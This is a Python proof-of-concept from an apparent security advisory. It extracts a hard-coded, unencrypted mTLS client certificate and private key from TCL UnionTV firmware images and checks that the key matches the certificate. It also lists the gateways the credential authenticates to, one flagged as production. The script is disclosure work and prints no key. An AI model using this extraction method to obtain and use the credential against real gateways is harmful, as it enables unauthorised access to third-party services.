#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC — Hard-coded mTLS client credential extraction & validation
Target: TCL UnionTV firmware, platform R41KT01 (Realtek RTD2841)

Demonstrates the advisory finding: the firmware ships a client certificate,
its UNENCRYPTED RSA private key and a fixed password, used for mutual-TLS
client authentication against third-party gateways (incl. BBC iPlayer prod).

This script contains NO key material. It operates on a firmware image or an
already-extracted vendor partition that YOU supply.

Usage
-----
  # from an extracted vendor partition:
  python3 poc.py --vendor ./vendor_x

  # straight from an OTA image (tar containing vendor.tar):
  python3 poc.py --image UpdateR609.img

Output: locates the config, extracts cert + key, and proves the private key
matches the certificate (identical RSA modulus) and is not encrypted.

Requires: openssl on PATH (or python 'cryptography' for the fallback path).
"""
import argparse
import io
import os
import re
import subprocess
import sys
import tarfile
import tempfile

CLIENT_DIR_HINT = os.path.join("tbrowser2", "config", "crt", "client")
FILES = ("client_cert_config.xml", "www.tcl.com.cert_bag.pem", "www.tcl.com.key.pem")


def norm_user_path(p):
    """Accept MSYS/Git-Bash style paths (/c/Users/...) on Windows."""
    if os.name == "nt" and re.match(r"^/[a-zA-Z]/", p):
        p = p[1].upper() + ":" + p[2:]
    return p



# --------------------------------------------------------------------------- #
# acquisition
# --------------------------------------------------------------------------- #
def from_vendor_dir(root):
    """Collect the target files from an extracted vendor/ tree."""
    found = {}
    for dirpath, _dirs, filenames in os.walk(root):
        if not os.path.normpath(dirpath).endswith(CLIENT_DIR_HINT):
            continue
        for name in filenames:
            if name in FILES:
                with open(os.path.join(dirpath, name), "rb") as fh:
                    found[name] = fh.read()
    return found


def from_image(path):
    """Pull the target files out of vendor.tar nested inside the OTA tar."""
    found = {}
    with tarfile.open(path, "r:") as outer:
        member = None
        for m in outer.getmembers():
            if os.path.basename(m.name) == "vendor.tar":
                member = m
                break
        if member is None:
            sys.exit(f"[!] vendor.tar not found inside {path}")

        inner = tarfile.open(fileobj=outer.extractfile(member), mode="r:")
        for m in inner:
            if not m.isfile():
                continue
            base = os.path.basename(m.name)
            if base in FILES and CLIENT_DIR_HINT.replace(os.sep, "/") in m.name:
                found[base] = inner.extractfile(m).read()
    return found


# --------------------------------------------------------------------------- #
# analysis
# --------------------------------------------------------------------------- #
def openssl(*args, data=None):
    """Run openssl, feeding `data` on stdin; return stdout text or None."""
    try:
        proc = subprocess.run(
            ["openssl", *args], input=data, stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL, timeout=30,
        )
        return proc.stdout.decode("utf-8", "replace") if proc.returncode == 0 else None
    except FileNotFoundError:
        return None


def modulus(pem, kind):
    out = openssl(kind, "-in", "/dev/stdin", "-noout", "-modulus", data=pem)
    if out is None:  # /dev/stdin does not exist everywhere (Windows)
        with tempfile.NamedTemporaryFile(suffix=".pem", delete=False) as tmp:
            tmp.write(pem)
            tmp_path = tmp.name
        try:
            out = openssl(kind, "-in", tmp_path, "-noout", "-modulus")
        finally:
            os.unlink(tmp_path)
    return re.sub(r"^.*=", "", out).strip() if out else None


def pem_hash(pem, kind):
    out = openssl(kind, "-in", "/dev/stdin", "-noout", "-pubout", data=pem)
    if out is None:
        return None
    return out


def main():
    ap = argparse.ArgumentParser(description="TCL UnionTV mTLS credential PoC")
    src = ap.add_mutually_exclusive_group(required=True)
    src.add_argument("--vendor", help="extracted vendor/ directory")
    src.add_argument("--image", help="OTA image (tar) containing vendor.tar")
    args = ap.parse_args()

    print("=" * 68)
    print(" TCL UnionTV (R41KT01) — hard-coded mTLS client credential PoC")
    print("=" * 68)

    if args.vendor:
        files = from_vendor_dir(norm_user_path(args.vendor))
    else:
        files = from_image(norm_user_path(args.image))
    if not files:
        sys.exit("[!] client credential files not found in the supplied source")

    print(f"[+] located {len(files)}/{len(FILES)} target file(s):")
    for name in FILES:
        print(f"      {'OK ' if name in files else 'MISS'}  {name}")
    if "www.tcl.com.key.pem" not in files or "www.tcl.com.cert_bag.pem" not in files:
        sys.exit("[!] need both the certificate and the private key to prove the pair")

    cert = files["www.tcl.com.cert_bag.pem"]
    key = files["www.tcl.com.key.pem"]

    # ---- config: hosts + hard-coded password -----------------------------
    cfg = files.get("client_cert_config.xml", b"").decode("utf-8", "replace")
    hosts = re.findall(r"<host>\s*([^<\s]+)\s*</host>", cfg)
    pw_present = bool(re.search(r"<password>\s*[^<]*\s*</password>", cfg))
    print(f"\n[+] hard-coded password entry present in config : {pw_present}")
    print(f"[+] authentication targets ({len(hosts)}):")
    for h in hosts:
        flag = "  <-- PRODUCTION" if "securegate" in h else ""
        print(f"      {h}{flag}")

    # ---- prove the key is unencrypted ------------------------------------
    enc = b"ENCRYPTED" in key or b"Proc-Type: 4" in key
    print(f"\n[+] private key encrypted                      : {enc}  (False = plaintext)")

    # ---- prove the pair matches ------------------------------------------
    cm = modulus(cert, "x509")
    km = modulus(key, "rsa")
    if cm and km:
        match = cm == km
        print(f"[+] certificate modulus                        : {cm[:32]}...")
        print(f"[+] private-key modulus                        : {km[:32]}...")
        print(f"[+] KEY PAIRS WITH CERTIFICATE                 : {match}")
    else:
        match = None
        print("[!] openssl unavailable — cannot verify the modulus match")

    # ---- certificate usage ------------------------------------------------
    subj = openssl("x509", "-in", "/dev/stdin", "-noout", "-subject", data=cert)
    if subj:
        print(f"[+] subject                                    : {subj.strip()}")

    print("\n" + "-" * 68)
    verdict = match is True and not enc
    print(" RESULT: " + ("VULNERABLE — shared plaintext mTLS client credential "
                         "shipped in firmware." if verdict else "inconclusive"))
    print("-" * 68)
    print(" Impact: anyone who extracts the (public) firmware obtains a valid")
    print(" client credential for the gateways listed above. No private-key")
    print(" material is reproduced by this script.")
    return 0 if verdict else 1


if __name__ == "__main__":
    raise SystemExit(main())
